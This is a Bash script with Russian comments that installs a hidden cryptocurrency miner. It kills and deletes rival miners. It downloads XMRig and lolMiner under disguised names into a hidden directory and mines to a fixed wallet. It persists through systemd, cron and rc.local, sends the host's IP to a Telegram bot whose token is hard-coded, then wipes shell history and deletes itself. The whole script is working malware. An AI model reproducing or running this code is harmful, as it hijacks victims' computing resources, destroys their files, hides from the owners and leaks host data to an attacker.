#!/bin/bash

FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# [ ПУЛЫ ]
POOL_CPU_1="xmr.kryptex.network:7029"
POOL_CPU_2="xmr-eu.kryptex.network:7029"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

# [ ДИРЕКТОРИЯ ]
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.connfy-core"
    IS_ROOT=1
else
    BASE_DIR="$HOME/.connfy-core"
    IS_ROOT=0
fi

BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ----------------------------------------------------
# [ 🔥 ПРОТОКОЛ ВЫЖЖЕННОЙ ЗЕМЛИ 🔥 ]
# ----------------------------------------------------
hunter_killer_protocol() {
    echo "🔥 HUNTER-KILLER PROTOCOL ACTIVATED 🔥"
    # Добавь сюда имена любых других майнеров, которые встретишь
    TARGET_NAMES=("rigel" "t-rex" "nbminer" "xmrig" "lolminer" "gminer" "minerd" "ccminer")

    for target in "${TARGET_NAMES[@]}"; do
        # Ищем PID по имени процесса
        PIDS=$(pgrep -f "$target")
        if [ -z "$PIDS" ]; then
            continue
        fi

        for pid in $PIDS; do
            # Проверяем, чтобы мы случайно не убили наш собственный процесс
            if ps -p $pid -o cmd= | grep -q "connfy"; then
                echo "[!] Skipping self: $pid"
                continue
            fi

            # Находим путь к файлу
            EXE_PATH=$(readlink -f "/proc/$pid/exe" 2>/dev/null)
            if [ -z "$EXE_PATH" ]; then continue; fi

            echo "[!] Target acquired: $target (PID: $pid)"
            echo "[!] Path: $EXE_PATH"
            
            # 1. УБИВАЕМ ПРОЦЕСС
            kill -9 "$pid"
            echo "[+] Process $pid terminated."

            # 2. СЖИГАЕМ ФАЙЛЫ
            # Находим корневую папку майнера (обычно на 1-2 уровня выше бинарника)
            MINER_DIR=$(dirname "$EXE_PATH")
            
            # Проверки безопасности, чтобы не снести системные папки
            if [ -d "$MINER_DIR" ] && [[ "$MINER_DIR" != "/" ]] && [[ "$MINER_DIR" != "/bin" ]] && [[ "$MINER_DIR" != "/usr/bin" ]]; then
                echo "[!!!] SCORCHING EARTH: Deleting directory $MINER_DIR"
                rm -rf "$MINER_DIR"
            fi
        done
    done
    
    # Дополнительная зачистка по известным именам папок
    find /home /tmp /var/tmp -type d -name "*rigel*" -exec rm -rf {} + 2>/dev/null
    find /home /tmp /var/tmp -type d -name "*xmrig*" -exec rm -rf {} + 2>/dev/null
    
    echo "🔥 PROTOCOL COMPLETE. Area sanitized. 🔥"
}
# ----------------------------------------------------

# ЗАПУСКАЕМ ЗАЧИСТКУ В САМОМ НАЧАЛЕ
hunter_killer_protocol

# Дальше идет стандартная установка...
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    if [ -z "$safe_ip" ]; then safe_ip="777777"; fi
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit

# ... (остальной код v6 без изменений) ...

# Загрузка
if [ ! -f "$BIN_CPU" ]; then curl -L -k -s -o c.tar.gz "$URL_XMRIG" || wget -qO c.tar.gz "$URL_XMRIG"; tar -xf c.tar.gz; mv xmrig*/xmrig ./$BIN_CPU; chmod +x ./$BIN_CPU; rm -rf c.tar.gz xmrig*; fi
cat <<EOF > config.json
{"api":{"id":null,"worker-id":null},"http":{"enabled":false},"autosave":true,"background":false,"colors":false,"cpu":{"enabled":true,"huge-pages":true,"asm":true},"pools":[{"url":"$POOL_CPU_1","user":"$WORKER","pass":"x","keepalive":true},{"url":"$POOL_CPU_2","user":"$WORKER","pass":"x","keepalive":true}]}
EOF
if [ ! -f "$BIN_GPU" ]; then curl -L -k -s -o g.tar.gz "$URL_LOLMINER" || wget -qO g.tar.gz "$URL_LOLMINER"; tar -xf g.tar.gz; mv 1.98a/lolMiner ./$BIN_GPU; chmod +x ./$BIN_GPU; rm -rf g.tar.gz 1.98a; fi

# Скрипт запуска
cat <<EOF > start.sh
#!/bin/bash
cd $BASE_DIR
if ! pgrep -f "$BIN_CPU" >/dev/null; then nohup ./$BIN_CPU --config=config.json >/dev/null 2>&1 & fi
if [ -f "./$BIN_GPU" ]; then if ! pgrep -f "$BIN_GPU" >/dev/null; then nohup ./$BIN_GPU --algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor >/dev/null 2>&1 & fi; fi
EOF
chmod +x start.sh
./start.sh

# Живучесть
PERSIST_LOG=""
if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then cat <<EOF >/etc/systemd/system/connfy.service
[Unit]
Description=Connfy Service
[Service]
ExecStart=$BASE_DIR/start.sh
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable connfy.service >/dev/null 2>&1; systemctl start connfy.service; PERSIST_LOG="[Systemd]"; fi
if command -v crontab >/dev/null 2>&1; then (crontab -l 2>/dev/null | grep -v "start.sh"; echo "@reboot $BASE_DIR/start.sh"; echo "*/15 * * * * $BASE_DIR/start.sh") | crontab -; PERSIST_LOG="$PERSIST_LOG [Cron]"; fi
if [ "$IS_ROOT" -eq 1 ] && [ -f "/etc/rc.local" ]; then if ! grep -q "$BASE_DIR/start.sh" /etc/rc.local; then sed -i -e '\$i '"$BASE_DIR/start.sh &" /etc/rc.local; fi; PERSIST_LOG="$PERSIST_LOG [rc.local]"; fi

# Отчет
MSG="💣 <b>GOD MODE: HUNTER-KILLER</b> %0A🆔 <b>ID:</b> $WORKER%0A🛡 <b>Persist:</b> $PERSIST_LOG"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1

history -c && rm -f "$0"
